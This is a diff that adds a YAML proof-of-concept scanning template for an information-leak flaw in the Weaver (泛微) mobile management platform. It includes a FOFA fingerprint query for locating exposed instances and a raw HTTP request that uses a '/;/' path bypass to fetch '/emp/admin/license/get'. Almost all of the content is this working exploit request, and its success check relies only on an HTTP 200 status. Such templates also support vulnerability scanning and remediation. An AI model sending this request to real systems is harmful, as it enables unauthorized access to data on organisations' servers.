@@ -1,0 +1,37 @@
+id: poc-npbygopzk3w1xcpt
+info:
+  name: 泛微-移动管理平台 get 信息泄露
+  author: hacktwo
+  severity: medium
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/npbygopzk3w1xcpt'
+  tags: info-leak,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: npbygopzk3w1xcpt
+    fofa: body="移动管理平台-企业管理"
+http:
+- raw:
+  - 'GET /;/emp/admin/license/get HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Range: bytes=0-100
+
+    Cache-Control: max-age=0
+
+    Upgrade-Insecure-Requests: 1
+
+    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.0.0 Safari/537.36
+
+    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh-HK;q=0.9,zh;q=0.8
+
+    Connection: close'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
